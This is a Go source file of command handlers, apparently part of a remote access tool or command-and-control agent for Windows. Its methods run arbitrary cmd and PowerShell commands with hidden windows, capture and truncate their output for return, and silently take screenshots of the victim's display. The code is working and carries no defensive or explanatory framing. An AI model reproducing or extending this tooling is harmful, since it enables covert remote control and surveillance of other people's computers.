package handlers

import (
	"context"
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
)

const (
	CommandTimeout = 15 * time.Second
)

type SystemManager struct{}

func NewSystemManager() *SystemManager {
	return &SystemManager{}
}

func (sm *SystemManager) ExecuteCMD(ctx context.Context, command string) string {
	ctx, cancel := context.WithTimeout(ctx, CommandTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "cmd", "/C", command)
	
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()

	result := string(output)
	if err != nil && result == "" {
		result = fmt.Sprintf("Error: %v", err)
	}
	if len(result) > 4000 {
		result = result[:4000] + "\n... [truncated]"
	}

	return result
}

func (sm *SystemManager) ExecutePowerShell(ctx context.Context, command string) string {
	ctx, cancel := context.WithTimeout(ctx, CommandTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", command)
	
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()

	result := string(output)
	if err != nil && result == "" {
		result = fmt.Sprintf("Error: %v", err)
	}

	if len(result) > 4000 {
		result = result[:4000] + "\n... [truncated]"
	}

	return result
}

func (sm *SystemManager) TakeScreenshot() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("no active displays found")
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", err
	}

	filePath := filepath.Join(os.TempDir(), fmt.Sprintf("sc_%d.png", time.Now().Unix()))
	file, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	if err := png.Encode(file, img); err != nil {
		os.Remove(filePath)
		return "", err
	}

	return filePath, nil
}
